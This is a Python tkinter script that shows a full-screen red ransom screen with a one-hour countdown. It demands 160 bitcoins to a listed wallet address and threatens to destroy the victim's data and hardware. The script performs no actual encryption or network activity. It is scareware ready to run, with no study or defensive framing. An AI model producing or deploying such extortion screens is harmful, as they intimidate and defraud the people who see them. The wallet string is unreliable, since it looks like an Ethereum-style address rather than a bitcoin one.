from playsound import playsound
import tkinter as tk
from tkinter import ttk
import customtkinter as ctk
from datetime import timedelta
from PIL import *
root = tk.Tk()
root.attributes("-fullscreen", True) 
root.configure(bg='red')
playsound('start.mp3')
image=Image.open('lol.png').resize((300,300))
imagetk=ImageTk.PhotoImage(image)
label=ttk.Label(root,text='anonimus',image=imagetk,borderwidth=0).pack()


timer_label = tk.Label(root,background="red",text="01:00:00", font=("Helvetica", 48))
timer_label.pack(pady=20)
time_left = timedelta(hours=1)
def update_timer():
    global time_left
    time_left -= timedelta(seconds=1) 
    timer_label.config(text=str(time_left))
    if time_left.total_seconds() > 0:root.after(1000, update_timer)
    else:timer_label.config(text="Time's up!")
update_timer()




label2=ttk.Label(root,
                 width=40,
                 font=('ubuntu mono', 30, 'bold'),
                 background="red",
                 text='Transfer bitcoins to this account in the amount of 160 bitcoins,\n otherwise all your information will be deleted and destroyed, and your computer\n will become impossible to use at the hardware level.').pack()




label3=ttk.Label(root,
                 width=40,
                 font=('ubuntu mono', 35),
                 background="red",
                 text='wallet: 0x58566904f57eac4E9EDd81BbC2f877865ECd35985').pack(pady=20)


root.mainloop()
playsound('start.mp3')
